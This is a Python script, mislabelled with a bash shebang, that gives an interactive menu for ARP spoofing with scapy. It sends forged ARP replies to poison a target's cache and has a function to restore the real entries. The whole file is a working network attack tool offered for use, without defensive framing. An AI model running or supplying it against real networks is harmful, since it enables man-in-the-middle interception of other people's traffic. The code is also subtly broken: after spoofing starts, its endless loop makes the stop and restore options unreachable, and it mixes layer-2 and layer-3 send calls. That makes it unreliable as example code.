#!/bin/bash
import scapy.all as sc
import time
import os
import sys

def getmac(ip):
    arprequest = sc.ARP(pdst=ip)
    broadcast = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    arprequest_broadcast = broadcast/arprequest
    ans, unans = sc.srp(arprequest_broadcast, timeout=1, verbose=False)

    if ans:
        return ans[0][1].hwsrc
    else:
        return None


def spoof(targetip, spoofed):
    targetmac = getmac(targetip)
    packet = sc.ARP(op=2, pdst=targetip, hwdst=targetmac, psrc=spoofed)
    sc.sendp(packet, verbose=False)

def restore(destip, srcip):
    destmac = getmac(destip)
    srcmac = getmac(srcip)
    packet = sc.ARP(op=2, pdst=destip, hwdst=destmac, psrc=srcip, hwsrc=srcmac)
    sc.send(packet, verbose=False)

def display_menu():
    print(" ARP Spoofer")
    print("============================")
    print("1. Start Spoofing")
    print("2. Stop Spoofing")
    print("3. Restore Original")
    print("4. Show Spoofed Entries")
    print("5. Exit")

def show_spoofed_entries():
    print("Spoofed ARP Entries:")
    for entry in arp_entries:
        print(f"{entry[0]} -> {entry[1]}")

def check_root():
    if os.geteuid() != 0:
        print("Access Denied. Root Privileges required.")
        sys.exit(1)

arp_entries = []

if __name__ == "__main__":
    check_root()
    while True:
        display_menu()
        ch = int(input("Enter your choice: "))

        if ch == 1:
            target = input("Enter target IP: ")
            spoofed = input("Enter your IP: ")
            print(f"Starting ARP spoofing between {target} and {spoofed}")
            while True:
                spoof(target, spoofed)
                arp_entries.append((target, spoofed))
                time.sleep(2)

        elif ch == 2:
            if len(arp_entries) == 0:
                print("No ARP entries are being spoofed.")
            else:
                print("Stopping ARP spoofing...")
                for entry in arp_entries:
                    restore(entry[0], entry[1])
                arp_entries = []

        elif ch == 3:
            destip = input("Enter target IP: ")
            srcip = input("Enter your IP: ")
            print(f"Restoring original ARP entries for {destip} and {srcip}")
            restore(destip, srcip)

        elif ch == 4:
            show_spoofed_entries()

        elif ch == 5:
            print("Exiting...")
            break

        else:
            print("Invalid choice. Please try again.")
